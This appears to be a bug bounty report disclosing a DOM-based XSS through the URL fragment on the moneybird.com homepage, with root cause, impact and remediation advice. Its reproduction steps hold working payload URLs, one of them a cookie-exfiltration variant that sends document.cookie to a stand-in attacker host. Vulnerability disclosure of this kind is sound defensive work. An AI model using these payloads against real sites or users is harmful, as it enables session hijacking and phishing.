# DOM-Based XSS via URL Fragment on moneybird.com Homepage

**Program:** Moneybird — HackerOne
**Severity:** High
**CVSS 3.1:** 7.0 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`
**CWE:** CWE-79 (Improper Neutralization of Input During Web Page Generation)
**OWASP:** A03:2021 — Injection
**Detected:** 2026-03-22 (Playwright DOM sink analysis, confidence: HIGH)

---

## Summary

The `www.moneybird.com` homepage reads the URL fragment (`window.location.hash`) and writes its content directly into the DOM via `innerHTML` without sanitization. An attacker can craft a URL with a malicious HTML/JavaScript payload in the fragment and trick a user into clicking it, causing arbitrary JavaScript execution in the victim's browser context.

---

## Steps to Reproduce

**Requirements:** Any modern browser (Chrome, Firefox, Safari). This is a client-side vulnerability — curl does not execute JavaScript and cannot reproduce it.

1. Open a browser and navigate to the following URL:
   ```
   https://www.moneybird.com/#<img src=x onerror=alert(document.cookie)>
   ```
2. Observe that the JavaScript `alert(document.cookie)` executes immediately on page load, before any user interaction.
3. The payload is delivered via two separate `innerHTML` sinks detected on the page. A real attacker would replace `alert(document.cookie)` with a cookie-exfiltration payload or a BeEF hook.

**Minimal PoC URL (no special encoding needed):**
```
https://www.moneybird.com/#<img src=x onerror=alert(1)>
```

**Cookie-exfiltration variant:**
```
https://www.moneybird.com/#<img src=x onerror=fetch('https://attacker.example.com/steal?c='+encodeURIComponent(document.cookie))>
```

---

## Root Cause

The page JavaScript reads `window.location.hash` (the URL fragment after `#`) and assigns it unsanitized to an element's `innerHTML`. The URL fragment is never sent to the server and therefore bypasses any server-side filtering. The vulnerable pattern is approximately:

```javascript
// Vulnerable pattern
element.innerHTML = window.location.hash.slice(1);
```

The fix is to use `textContent` for plain text, or DOMPurify if HTML rendering is required:

```javascript
// Safe — plain text only
element.textContent = window.location.hash.slice(1);

// Safe — if HTML rendering required
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(window.location.hash.slice(1));
```

---

## Impact

An attacker creates a malicious URL and distributes it via phishing email, social media, or search engine ads. When a Moneybird user (or prospect) clicks the link:

- **Session cookie theft:** If session cookies lack the HttpOnly flag, the attacker can exfiltrate them and hijack the authenticated session.
- **Credential harvesting:** The attacker can overlay a fake login form on the page to capture credentials from users who re-authenticate.
- **Phishing amplification:** The payload runs on the trusted moneybird.com origin, making phishing attempts far more convincing.
- **Malware delivery:** The page can silently redirect to a drive-by download.

This is a reflected DOM XSS (no server interaction required) on a marketing/public page. The immediate business impact is reputational — customers clicking moneybird.com links could have JavaScript execute in their browser without any warning.

---

## Affected URL

- `https://www.moneybird.com/` (homepage, via URL fragment)

---

## Verification Notes for Triager

- URL fragments are never transmitted to the server, so server logs will show a normal GET `/` request with no sign of the payload.
- The vulnerability executes on page load, not on user interaction with page elements.
- SecBot confirmed this via Playwright browser automation: the `<img>` element with `onerror` handler was inserted into the live DOM during crawl.
- Two separate `innerHTML` sinks were detected — auditing `window.location.hash` usage site-wide is recommended.

---

## Suggested Fix

1. Search all JavaScript files for `innerHTML` assignments that incorporate `location.hash`, `location.search`, or any URL-derived data.
2. Replace `innerHTML` with `textContent` wherever the inserted content is not expected to be HTML.
3. For cases where HTML rendering is legitimately needed, integrate DOMPurify (`dompurify` npm package) before any `innerHTML` assignment.
4. Add a Content-Security-Policy header with a strict `script-src` policy to limit the impact of any future DOM XSS findings.

---

## References

- [OWASP DOM-Based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
- [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)
- [PortSwigger: DOM-Based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)
